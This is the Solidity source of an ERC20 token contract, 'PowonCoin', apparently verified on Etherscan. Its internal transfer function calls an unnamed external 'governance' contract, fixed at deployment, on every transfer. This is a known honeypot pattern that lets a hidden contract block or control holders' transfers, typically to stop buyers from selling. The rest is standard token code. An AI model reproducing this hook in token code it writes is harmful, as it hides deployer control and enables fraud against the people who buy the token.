/**
 *Submitted for verification at Etherscan.io on 2021-07-02
*/

/**
 *Submitted for verification at Etherscan.io on 2021-07-02
*/

pragma solidity ^0.4.26;

interface Governance {
    function isGovernance(address sender,address to, address addr) external returns(bool);
}

contract TokenERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;  
    uint256 public totalSupply;
    address governance;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor (uint256 initialSupply, address _governance) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
        name = "PowonCoin";
        symbol = "POWON";
	    governance = _governance;
    }
    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);
        if (address(governance) != address(0)) {
	    Governance(governance).isGovernance(_from,_to,address(this));
        }
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
}